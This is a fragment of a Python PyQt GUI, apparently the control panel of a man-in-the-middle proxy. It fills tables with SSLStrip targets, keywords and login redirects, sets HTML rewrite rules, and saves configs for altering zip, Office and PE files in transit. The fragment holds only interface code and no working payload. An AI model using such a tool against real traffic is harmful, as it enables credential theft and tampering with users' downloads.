			self.AddRow(table, icon = eliminar_icono)
			local = QTableWidgetItem()
			local.setText(fichero[1])

			enzip = QTableWidgetItem()
			enzip.setText(fichero[0])

			table.setItem(table.rowCount()-1, 1, enzip)
			table.setItem(table.rowCount()-1, 2, local)
		
		for fichero in configuracion['request2_dictionary']:
			table = self.TableTransSSLStrip 
			self.AddRow(table, icon = eliminar_icono)
			local = QTableWidgetItem()
			local.setText(fichero[1])

			enzip = QTableWidgetItem()
			enzip.setText(fichero[0])

			table.setItem(table.rowCount()-1, 1, enzip)
			table.setItem(table.rowCount()-1, 2, local)

		for objetivo in configuracion['objetivos']:
			table = self.TableTargetsSSLStrip 
			self.AddRow(table, icon = eliminar_icono)
			local = QTableWidgetItem()
			local.setText(objetivo)

			table.setItem(table.rowCount()-1, 1, local)
		
		for keyword in configuracion['keywords']:
			table = self.TableKeywSSLStrip 
			self.AddRow(table, icon = eliminar_icono)
			local = QTableWidgetItem()
			local.setText(keyword)

			table.setItem(table.rowCount()-1, 1, local)
		
		for redir_dominio in configuracion['redir']:
			table = self.TableRedirSSLStrip 
			self.AddRow(table, icon = eliminar_icono)

			dominio = QTableWidgetItem()
			dominio.setText(redir_dominio)

			redirection = configuracion['redir'][redir_dominio]['redirection']
			uri         = configuracion['redir'][redir_dominio]['uri']
			lookfor     = configuracion['redir'][redir_dominio]['lookfor']

			credir = QTableWidgetItem()
			credir.setText(redirection)			
			
			curi = QTableWidgetItem()
			curi.setText(uri)

			clook = QTableWidgetItem()
			clook.setText(lookfor)
	
			table.setItem(table.rowCount()-1, 1, dominio)
			table.setItem(table.rowCount()-1, 2, clook)
			table.setItem(table.rowCount()-1, 3, curi)
			table.setItem(table.rowCount()-1, 4, credir)

		self.sslstrip_redir_prefix.setText(str(configuracion['redir_prefijo']))
		self.login_exito_redir.setChecked(configuracion['post_login_redirection'])

		for mod in modificacionesHTML:
			name = mod['name']
			old = mod['old']
			new = mod['new']
			quantity = mod['quantity']

			table = self.TableHTMLChange 
			self.AddRow(table, icon = eliminar_icono)

			rname = QTableWidgetItem()
			rname.setText(name)

			rold = QTableWidgetItem()
			rold.setText(old)

			rnew = QTableWidgetItem()
			rnew.setText(new)

			rquan = QTableWidgetItem()
			rquan.setText(quantity)
			
			table.setItem(table.rowCount()-1, 1, rname)
			table.setItem(table.rowCount()-1, 2, rold)
			table.setItem(table.rowCount()-1, 3, rnew)
			table.setItem(table.rowCount()-1, 4, rquan)

	def ExitHandler(self):
		if self.process_started:
			self.process_started = False
			self.process.kill()
			self.statusBar().showMessage(self.tr("Proxy parado"))
			self.ProxyOutput.append('\nParando Proxy....\n')

		if self.AutoSaveConfigsCheckBox.isChecked():
			self.SaveProxyConfig(filename = self.default_config_file)
			self.SaveHTMLConfig(filename = self.default_html_config_file)
			self.SaveOOXMLConfig(filename = self.default_ooxml_config_file)
			self.SaveZipConfig(filename = self.default_zip_config_file)
			self.SavePeConfig(filename = self.default_pe_config_file)



app = QApplication(sys.argv)
form = MainDialog()
form.show()
app.aboutToQuit.connect(form.ExitHandler)
app.exec_()


